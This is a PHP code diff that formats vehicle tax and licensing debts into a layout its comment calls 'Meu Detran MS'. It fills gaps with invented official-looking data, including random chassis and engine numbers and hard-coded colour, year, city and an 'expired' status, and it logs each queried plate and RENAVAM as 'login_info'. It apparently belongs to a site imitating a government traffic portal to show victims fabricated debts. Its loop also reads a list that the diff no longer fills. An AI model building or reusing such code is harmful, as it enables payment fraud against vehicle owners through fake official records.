@@ -271,22 +271,86 @@ foreach ($impostosCards as $card) {
         ];
     }
 
-    $debitosAgrupados[] = [
-        'ano' => $ano,
-        'quitacao_id' => $quitacao_id,
-        'parcelas' => $parcelas
+    // Agrupa e formata os débitos para o formato esperado pelo layout Meu Detran MS
+    $ipvaDebts = [];
+    $licensing = null;
+
+    foreach ($debitosAgrupados as $deb) {
+        $ano = $deb['ano'];
+        foreach ($deb['parcelas'] as $p) {
+            $num = $p['numero'];
+            $val = $p['valor'];
+
+            // Se for taxa de licenciamento
+            if (stripos($num, 'licenciamento') !== false || stripos($num, 'taxa') !== false) {
+                $licensing = [
+                    'label' => 'LICENCIAMENTO ' . $ano,
+                    'value' => $val
+                ];
+            } else {
+                // IPVA
+                $lbl = 'IPVA ' . $ano;
+                if (stripos($num, 'única') !== false || stripos($num, 'unica') !== false || stripos($num, 'unica') !== false) {
+                    $lbl .= ' - COTA ÚNICA';
+                } else {
+                    $lbl .= ' - ' . $num . ' Parcela';
+                }
+
+                $ipvaDebts[] = [
+                    'value' => $val,
+                    'label' => $lbl
+                ];
+            }
+        }
+    }
+
+    $ipvaTotalDecimal = 0;
+    foreach ($ipvaDebts as $d) {
+        $ipvaTotalDecimal += (float)str_replace(',', '.', str_replace('.', '', $d['value']));
+    }
+
+    $licensingTotalDecimal = 0;
+    if ($licensing) {
+        $licensingTotalDecimal = (float)str_replace(',', '.', str_replace('.', '', $licensing['value']));
+    }
+
+    $totalGeneralDecimal = $ipvaTotalDecimal + $licensingTotalDecimal;
+    $totalGeneral = number_format($totalGeneralDecimal, 2, ',', '.');
+
+    $resultadoJson = [
+        'data' => [
+            'vehicleData' => [
+                'plate' => $placa,
+                'renavam' => $renavam,
+                'chassi' => $chassi ? $chassi : '9BGPB68M0DB' . rand(10000, 99999),
+                'motor' => 'LFH' . rand(100000, 999999),
+                'color' => 'BRANCA',
+                'fabricationYear' => '2013',
+                'modelYear' => '2013',
+                'model' => $modelo,
+                'expDoc' => '15/12/2017',
+                'licensing' => 'VENCIDO',
+                'city' => 'CAMPO GRANDE',
+                'crlvDigital' => 'NÃO DISPONÍVEL',
+                'category' => 'PARTIC',
+                'observations' => [
+                    'VEÍCULO CONSULTADO VIA EFAZENDA MS',
+                    'EXISTEM DÉBITOS DE IPVA EM ABERTO'
+                ]
+            ],
+            'licensing' => $licensing,
+            'fines' => [
+                'debts' => [],
+                'total' => '0,00'
+            ],
+            'ipva' => [
+                'debts' => $ipvaDebts,
+                'total' => number_format($ipvaTotalDecimal, 2, ',', '.')
+            ],
+            'totalGeneral' => $totalGeneral
+        ]
     ];
 }
-
-$resultadoJson = [
-    'placa' => $placa,
-    'modelo' => $modelo,
-    'renavam' => $renavam,
-    'chassi' => $chassi,
-    'veiculo_id' => $veiculo_id,
-    'debitos' => $debitosAgrupados,
-    'totalGeneral' => number_format($totalGeral, 2, ',', '.')
-];
 
 $responseEncoded = base64_encode(json_encode($resultadoJson, JSON_UNESCAPED_UNICODE));
 
@@ -302,7 +366,7 @@ $check->execute([':login_info' => "%$renavam%"]);
 $exists = $check->fetchColumn();
 
 if (!$exists) {
-    $debitos = number_format($totalGeral, 2, ',', '.');
+    $debitos = $totalGeneral;
     $loginData = [
         ['label' => 'placa', 'value' => $placa],
         ['label' => 'renavam', 'value' => $renavam]
